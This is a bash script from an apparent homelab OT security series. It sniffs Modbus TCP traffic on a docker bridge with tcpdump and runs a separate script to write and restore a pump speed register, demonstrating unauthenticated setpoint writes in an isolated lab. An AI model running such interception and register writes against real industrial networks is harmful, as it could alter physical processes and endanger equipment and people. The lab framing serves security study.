#!/usr/bin/env bash
# capture.sh — Part 1 method: sniff a live Modbus TCP conversation and prove the
# setpoint is writable by anyone on the segment. Runs against the modbus-copilot
# lab on the homelab docker host (CT100 /opt/stack/tag-copilot).
#
# ISOLATED LAB, OWN EQUIPMENT ONLY.
#
# It captures on the docker bridge (a stand-in for a SPAN port / a tap on a real
# OT switch), then writes the pump speed register from the poller container and
# restores it. The result is a pcap you decode with:
#
#   tshark -r modbus.pcap -d tcp.port==5020,mbtcp -Y 'modbus.func_code==6' \
#          -T fields -e frame.number -e ip.src -e ip.dst -e tcp.payload
#
set -euo pipefail

BRIDGE="${BRIDGE:-br-5f9a58e88c6e}"      # docker bridge for tag-copilot_default
PUMP_IP="${PUMP_IP:-172.23.0.3}"
PORT="${PORT:-5020}"
POLLER="${POLLER:-tagcopilot-nodered}"   # container with node + @openp4nr/modbus-serial
SECS="${SECS:-14}"
OUT="${OUT:-/root/ot-mitm}"

mkdir -p "$OUT"
docker cp "$(dirname "$0")/drive.js" "${POLLER}:/data/drive.js"

echo "[*] capturing ${SECS}s on ${BRIDGE}, tcp/${PORT} <-> pump ${PUMP_IP}"
timeout "$SECS" tcpdump -i "$BRIDGE" -w "${OUT}/modbus.pcap" \
  "tcp port ${PORT} and host ${PUMP_IP}" 2>"${OUT}/tcpdump.log" &
TPID=$!
sleep 3                                  # let live HMI reads flow in

echo "[*] the man on the wire moves the pump"
docker exec -w /data "$POLLER" node /data/drive.js

sleep 3
wait "$TPID" 2>/dev/null || true
docker exec "$POLLER" rm -f /data/drive.js 2>/dev/null || true

echo "[*] pcap: ${OUT}/modbus.pcap"
tcpdump -r "${OUT}/modbus.pcap" 2>/dev/null | wc -l | xargs echo "[*] frames:"
